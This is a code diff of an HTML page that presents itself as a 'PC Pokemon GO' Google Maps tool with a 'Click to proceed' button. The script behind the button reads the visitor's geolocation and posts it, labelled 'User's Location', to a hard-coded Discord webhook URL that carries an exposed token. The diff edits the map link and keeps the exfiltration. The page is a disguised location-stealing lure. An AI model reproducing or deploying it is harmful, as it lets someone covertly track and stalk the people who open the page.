@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en"><head>
-    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>PC Pokemon GO Using Google Maps API</title>
+    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>PC Pokemon GO Google Maps API</title>
     <style>
         body {
             background-color: black;
@@ -27,15 +27,15 @@
             transition: background-color 0.3s;} #sendLocation:hover {
             background-color: darkred;} h1 {
             position: absolute;
-            top: 50%;
-            transform: translateY(-50%);            font-size: 24px;
+            top: 20%;
+            font-size: 24px;
             text-align: center;} </style>
 </head>
 <body>
     <h1>Click to proceed</h1>
     <div id="buttonContainer">        <button id="sendLocation">•</button>
     </div>
-    <audio id="audio" src=funny.mp3" preload="auto"></audio> <!-- Replace with your audio file -->
+    <audio id="audio" src="funny.mp3" preload="auto"></audio> <!-- Replace with your audio file -->
 
     <script>
         document.getElementById('sendLocation').addEventListener('click', function() {
@@ -45,7 +45,8 @@
                 alert("Geolocation is not supported by this browser.");} });        function sendLocation(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const googleMapsLink =`https://www.google.com/maps/@${lat},${lon},15z`;            const webhookUrl = 'https://discord.com/api/webhooks/1337154258281168896/NQv_m_JccepgAedCn1Le3_QindKI_voWv9L0NoI9itCIN5bpJNwXcFzDQWZRYbXH9oFb'; // Replace with your Discord webhook URL
+            // Create a Google Maps link with a marker
+            const googleMapsLink =`https://www.google.com/maps/@?api=1&map_action=map&center=${lat},${lon}&zoom=15&markers=color:red%7Clabel:C%7C${lat},${lon}`;            const webhookUrl = 'https://discord.com/api/webhooks/1337154258281168896/NQv_m_JccepgAedCn1Le3_QindKI_voWv9L0NoI9itCIN5bpJNwXcFzDQWZRYbXH9oFb'; // Replace with your Discord webhook URL
             const data = {
                 content:`User's Location:${googleMapsLink}`            };
 
